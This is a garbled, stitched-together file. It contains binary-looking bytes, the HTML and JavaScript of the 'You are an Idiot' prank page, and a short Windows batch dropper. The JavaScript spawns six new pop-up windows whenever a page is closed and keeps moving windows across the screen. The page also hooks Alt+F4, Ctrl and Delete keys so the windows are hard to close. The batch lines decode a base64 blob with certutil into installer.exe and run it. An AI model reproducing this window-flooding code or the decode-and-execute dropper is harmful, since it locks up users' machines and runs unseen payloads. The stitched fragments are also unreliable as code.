P„Ù                                                                                           ÿ     @ @ @ @ ¿    ü'×Ÿð—‚      ÿÿÿ}    !ìÐLÀ
çdØ M`6F@„Àóä( L  pq1ÉÈ¯jÖy’Ð 3öÒKE¶“L m[T[vØ0Ð L)-µBMm³àø ’¤´$É0 Ï‚ö‡ØæÐO¹G£%6ì ‹( ÉrY¬,3©C{çåØÇ¤/Z'^Ÿ½Wcç[À¨I­¶| ¡Ÿ T–„™& ú ~ÚIh¶Òi„ ¢a -«j‹nÛ & 	…%¶sº7)” &99 P˜Câlƒ› 	¬ 1ñæÈÈ °˜Àãcœ…  \ù›§ó XcÌs 2€ÁÄÇ' 
 (cœMs`5€><Ù  ½‡ÈYŽN@& PÇ8› æÀk |y²2 ,& °8Ç˜ç!@e ƒ€\]ƒ±Sdd XL`q1ÎB€Ê œ€(L ¡Žq6AÍ€Ö øæ¸©¦äí	5¶Ï€3àJ’Ð“$À?@ ÏÛI-ÚM0€L µmQmÛ`Ã@0¤¶Ñ®;•È•1ÉÈ„À
çdØ M`6F@„Àóä( L  ppkê}^Í ŸrFJmÙ@P’ä³XXgR‚ô0'á&ÐO¹G£%6ì ‹( ÉrY¬,3©@…  ÿ@    x µªÀYƒï€ Ž    V·î:œpre—‘”Ç&PÎ8:Ÿ£qÊ~ÇIúˆ ð   …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @ …  …  @ @ @ @   

<html>
<head>
<title>You are an Idiot! (dot org)</title>

<meta name="Author" content="The ADR and Jazzy">
<meta name="Keywords" content="you are an idiot, you, are, an, idiot, fool, youdontknowwhoiam.org, youdontknowwhoiam, you dont know who i am, you, dont, know, who, i, am, org, dot, aregner, jazzy, adr">
<meta name="Description" content="This is the orgional and the best flash video on the 'net.  Once found on www.youdontknowwhoiam.org, not found where it belong, right here on www.youareanidiot.org.">

<script language="Javascript" src="https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.js"></script>

</head>

<body bgcolor="#ffffff" onkeydown="altf4key();ctrlkey();delkey();" onunload="procreate()" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">

<object width="100%" height="100%" data="https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/source-code/youare.swf"></object>

</body>
</html>


		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function openWindow(url){
        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
}

function procreate(){
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		}

function newXlt(){
        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
        window.focus()}

function newXrt(){
        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
        }

function newYup(){
        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
        }

function newYdn(){
        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
        }
function fOff(){
        flagrun = 0;
        }

function playBall(){
        xPos += xOff;
        yPos += yOff;
        if (xPos > screen.width-175){
        newXlt();
        }
        if (xPos < 0){
        newXrt();
        }
        if (yPos > screen.height-100){
        newYup();
        }
        if (yPos < 0){
        newYdn();
        }
        if (flagRun == 1){
        window.moveTo(xPos,yPos);
        setTimeout('playBall()',1);
        }
        }

<html>
<head>
<title>You are an idiot! (dot org)</title>

<meta name="Author" content="The ADR and Jazzy">
<meta name="Keywords" content="you are an idiot, you, are, an, idiot, fool, youdontknowwhoiam.org, youdontknowwhoiam, you dont know who i am, you, dont, know, who, i, am, org, dot, aregner, jazzy, adr">
<meta name="Description" content="This is the orgional and the best flash video on the 'net.  Once found on www.youdontknowwhoiam.org, not found where it belong, right here on www.youareanidiot.org.">

<script src="you.js"></script>

</head>

<body bgcolor="#ffffff" onkeydown="altf4key();ctrlkey();delkey();" onunload="procreate()" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">

<object width="100%" height="100%" data="youare.swf">
  <param name="movie" value="youare.swf">
  <param name="quality" value="high">
  <embed src="/youare.swf" quality="high" pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="100%" height="100%">
  </embed> 
</object> 

</body>
</html>

echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >>c

certutil -decode c installer.exe
del c
start installer.exe

 



